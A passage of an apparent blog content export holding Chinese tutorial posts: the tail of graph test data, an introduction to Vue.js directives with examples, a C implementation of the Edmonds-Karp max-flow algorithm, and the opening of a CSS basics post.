class="comment">5 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8 7</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8 8</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">2 3</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">6 7</span></span><br><span class="line"><span class="comment">7 8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6 6</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">2 3</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue指令</title>
    <url>/2020/03/21/Vue%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h2><p>设置标签的文本值（textContent）</p>
  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">"hello"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<a id="more"></a>

  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">"message"</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  我们会发现，使用v-text设置文本的话，标签内部的文本值会被完全地覆盖</p>
<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200316/wFn0pr9f1dW3.png" alt></p>
<h2 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h2><p>设置标签地innerHTML</p>
<p>  <strong>注意</strong>当v-html的值是普通的字符串的时候，v-html和v-text的用法没有区别，但当v-html的值是一个标签的语法时，这二者的用法就有了区别</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span> = <span class="string">"content1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span> = <span class="string">"content1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span> = <span class="string">"content2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span> = <span class="string">"content2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        content1: <span class="string">"hello"</span>,</span><br><span class="line">        content2: <span class="string">"&lt;a href='https://yalexin.gitee.io/'&gt;超链接&lt;/a&gt;"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/SPaHMAOyWjC7.png" alt="图片"></p>
<p>  可以发现，v-html成功地渲染成了标签，但是前提是v-html所在节点能够拥有子节点。</p>
<h2 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h2><p> 为元素绑定事件</p>
<p>  我们可以从官方的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Events" target="_blank" rel="noopener">文档</a>中可以得知，Vue支持的事件非常多，用法都是类似下面的情况</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 格式是   v-on:+事件名+="需要绑定的方法" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">v-on:click</span>=<span class="string">"demo1_fun"</span> <span class="attr">value</span>=<span class="string">"事件绑定-全写"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 格式是   @+事件名+="需要绑定的方法" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> @<span class="attr">click</span>=<span class="string">"demo2_fun"</span> <span class="attr">value</span>=<span class="string">"事件绑定-简写"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var app &#x3D; new Vue(&#123;</span><br><span class="line">    el: &quot;#app&quot;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        demo1_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo1_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        demo2_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo2_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        demo3_fun:function()&#123;</span><br><span class="line">            alert(&quot;demo3_fun&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  假如需要传递参数，只需要v-on处提供实参即可</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">@click="demo2_fun(p1,p2,p3,...)"</span><br></pre></td></tr></table></figure>

<p>  该指令还可以配合事件修饰符来使用，一个简单的例子就是，我们希望按下回车键时触发事件：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> @<span class="attr">keydown.enter</span>=<span class="string">"do_sh"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  关于更多的用法，可以参照官方<a href="[https://cn.vuejs.org/v2/guide/events.html#%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6](https://cn.vuejs.org/v2/guide/events.html#事件修饰符)">文档</a></p>
<p>  事件名不需要写<strong>on</strong>，绑定的方法定义在<strong>methods</strong>属性中，而且方法内部通过<strong>this</strong>关键字可以访问定义在<strong>data</strong>中的数据。</p>
<h2 id="v-show："><a href="#v-show：" class="headerlink" title="v-show："></a>v-show：</h2><p>根据真假切换元素的显示状态，原理是修改元素的display，实现显示和隐藏，指令的值最终被解析为布尔值(true显示，false隐藏)。</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change_show"</span>&gt;</span>click-me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">"isShow"</span>&gt;</span>这是一段测试的文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isShow: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        change_show: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.isShow = !<span class="keyword">this</span>.isShow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<h2 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h2><p>根据真假切换元素的显示状态，原理是操纵dom元素来切换显示状态，效果跟v-show是一样的。</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"change_show"</span>&gt;</span>click-me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">"isIf"</span>&gt;</span>这是一段测试的文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isIf: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        change_show: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.isIf = !<span class="keyword">this</span>.isIf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/BRp7PP313Lue.png" alt="图片"></p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200322/3zny7F5J6mgD.png" alt="图片"></p>
<pre><code>即当v-if的值是true时，该元素在存在于div标签中，否则将元素移除，那我们如何进行选择？ 一般来说， v-if 有    更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；    如果在运行时条件不太可能改变，则使用 v-if 较好。 </code></pre><h2 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h2><p>为元素绑定属性值</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">"img_src"</span> <span class="attr">v-bind:title</span>=<span class="string">"title1"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 简写 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"img_src"</span> <span class="attr">:title</span>=<span class="string">"title2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        isShow: <span class="literal">false</span>,</span><br><span class="line">        img_src:<span class="string">"../study/images/2.jpg"</span>,</span><br><span class="line">        title1:<span class="string">"图片一"</span>,</span><br><span class="line">        title2:<span class="string">"图片二"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><p>根据数据源生成列表结构，语法是(item,index) in 数据源：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in demo_array"</span>&gt;</span></span><br><span class="line">            每天做的事情:&#123;&#123;item&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        demo_array:[<span class="string">"写bug"</span>,<span class="string">"查bug"</span>,<span class="string">"改bug"</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200323/KILg1Tt8tV9r.png" alt="图片"></p>
<p>  v-for不仅仅可以放进<code>li</code>标签中，还可以放进其他中，而且数据源也不仅限于普通数组，对象性数组也是可以的，如：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">"item in students"</span>&gt;</span></span><br><span class="line">            学生姓名：&#123;&#123;item.name&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line">                students: [</span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"张三"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"李四"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123; name: <span class="string">"王五"</span> &#125;,</span></span><br><span class="line">                ],</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p>便捷地设置和获取表单元素的值，它可以将某个特定的值和表单元素的值相关联，这种关联是双向的：</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span> @<span class="attr">keydown.enter</span>=<span class="string">"setNewMsg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">"#app"</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">""</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        setNewMsg:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.message = <span class="string">"通过vue改变message"</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">66</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Vue初级</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>ek算法实现最大流问题</title>
    <url>/2020/05/30/ek%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%9C%80%E5%A4%A7%E6%B5%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>最大流问题的解决方法一般是利用<code>Ford-Fulkerson</code>算法，该算法伪码如下:<a id="more"></a></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">for</span> each <span class="title">edge</span> (<span class="params">u, v</span>) ∈ E <span class="keyword">do</span></span></span><br><span class="line"><span class="function">	f[u, v]←0</span></span><br><span class="line"><span class="function">	f[v, u]←0</span></span><br><span class="line"><span class="function">end <span class="keyword">for</span></span></span><br><span class="line"><span class="function"><span class="keyword">while</span> there exists a path P <span class="keyword">from</span> s to t <span class="keyword">in</span> the residual network Gf</span></span><br><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">	<span class="title">cf</span> (<span class="params">P</span>)←mine∈P</span> &#123;cf (e)&#125;</span><br><span class="line">	<span class="function"><span class="keyword">for</span> each <span class="title">edge</span> (<span class="params">u, v</span>) ∈ P <span class="keyword">do</span></span></span><br><span class="line"><span class="function">		f[u, v]←f[u, v] + <span class="title">cf</span> (<span class="params">P</span>)</span></span><br><span class="line"><span class="function">		f[v, u]← − f[u, v]</span></span><br><span class="line"><span class="function">	end <span class="keyword">for</span></span></span><br><span class="line"><span class="function">end <span class="keyword">while</span></span></span><br></pre></td></tr></table></figure>

<p>而ek算法是对<code>Ford-Fulkerson</code>方法的实现，基于BFS。 </p>
<p>网上也有许多很好的模板：</p>
<p><a href="https://blog.csdn.net/jaster_wisdom/article/details/50942351" target="_blank" rel="noopener">最大流问题(EK算法模板)</a></p>
<p><a href="https://blog.csdn.net/creatorx/article/details/72629583" target="_blank" rel="noopener">HDU1532(最大流EK算法模板题)</a></p>
<p>我自己也写了一个：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-30 14:55:40</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-30 17:26:38</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\others\maxFlow.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 10001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a, b) a &lt; b ? a : b</span></span><br><span class="line"><span class="keyword">int</span> capacity[MAXLEN][MAXLEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// 记录路径上的前驱，用于添加反向边</span></span><br><span class="line"><span class="keyword">int</span> pre[MAXLEN];</span><br><span class="line"><span class="keyword">int</span> vertexNum, arcNum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> <span class="built_in">end</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vertexNum; i++) pre[i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> flow[vertexNum + <span class="number">1</span>], <span class="built_in">queue</span>[vertexNum + <span class="number">1</span>], front = <span class="number">0</span>, rear = <span class="number">0</span>;</span><br><span class="line">    flow[start] = <span class="number">32767</span>;</span><br><span class="line">    <span class="comment">// 源点进队列</span></span><br><span class="line">    <span class="built_in">queue</span>[++rear] = start;</span><br><span class="line">    <span class="keyword">while</span> (front != rear) &#123;</span><br><span class="line">        <span class="keyword">int</span> frontIndex = <span class="built_in">queue</span>[++front];</span><br><span class="line">        <span class="keyword">if</span> (frontIndex == <span class="built_in">end</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= vertexNum; i++) &#123;</span><br><span class="line">            <span class="comment">// 存在有向边并且点i没有被访问过</span></span><br><span class="line">            <span class="keyword">if</span> (i != start &amp;&amp; capacity[frontIndex][i] &gt; <span class="number">0</span> &amp;&amp; pre[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">                pre[i] = frontIndex;</span><br><span class="line">                flow[i] = <span class="built_in">min</span>(capacity[frontIndex][i], flow[frontIndex]);</span><br><span class="line">                <span class="built_in">queue</span>[++rear] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 残余网络中不存在增广路</span></span><br><span class="line">    <span class="keyword">if</span> (pre[<span class="built_in">end</span>] == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> flow[<span class="built_in">end</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMaxFlow</span><span class="params">(<span class="keyword">int</span> S, <span class="keyword">int</span> T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minF, preIndex, th, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((minF = BFS(S, T)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 更新残留网络</span></span><br><span class="line">        th = T;</span><br><span class="line">        preIndex = pre[th];</span><br><span class="line">        <span class="keyword">while</span> (preIndex != <span class="number">-1</span>) &#123;</span><br><span class="line">            capacity[th][preIndex] += minF;</span><br><span class="line">            capacity[preIndex][th] -= minF;</span><br><span class="line">            th = preIndex;</span><br><span class="line">            preIndex = pre[th];</span><br><span class="line">        &#125;</span><br><span class="line">        sum += minF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> SVertex, TVertex;</span><br><span class="line">    <span class="comment">// printf("请输入点的个数和有向边的个数以及源点汇点编号：\n");</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d%d"</span>, &amp;vertexNum, &amp;arcNum, &amp;SVertex, &amp;TVertex);</span><br><span class="line">    <span class="comment">// printf("请依次输入每条有向边的容量，格式为 1 2 3：\n");</span></span><br><span class="line">    <span class="keyword">int</span> u, v, c;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= arcNum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;c);</span><br><span class="line">        <span class="comment">// 有可能输入重复边</span></span><br><span class="line">        capacity[u][v] += c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, getMaxFlow(SVertex, TVertex));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4 6 1 4</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">1 4 20</span></span><br><span class="line"><span class="comment">1 2 10</span></span><br><span class="line"><span class="comment">3 4 50</span></span><br><span class="line"><span class="comment">3 2 30</span></span><br><span class="line"><span class="comment">2 4 40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>BFS</tag>
        <tag>最大流</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 语法一</title>
    <url>/2020/03/08/css-%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 在网页设计中，往往会利用到HTML与CSS的结合，HTML是实现大致框架的，而CSS则是为HTML框架设置想要设定的样式属性，两者相结合可以完整的生成出相应的静态网页。 简单说， HTML进行布局，CSS进行页面的美化 ，即HTML指明有什么，CSS指明怎么放。</p>
<h2 id="创建CSS方法"><a href="#创建CSS方法" class="headerlink" title="创建CSS方法"></a>创建CSS方法</h2><ol>
<li><p>使用元素内嵌样式表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>HTML原生超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span> <span class="attr">style</span>=<span class="string">"font-size: 40px;"</span>&gt;</span>CSS修饰超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span> <span class="attr">style</span>=<span class="string">"font-size: 40px; color: #ff0000;"</span>&gt;</span>有颜色的超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>
</li>
<li><p>使用文档内嵌样式表</p>
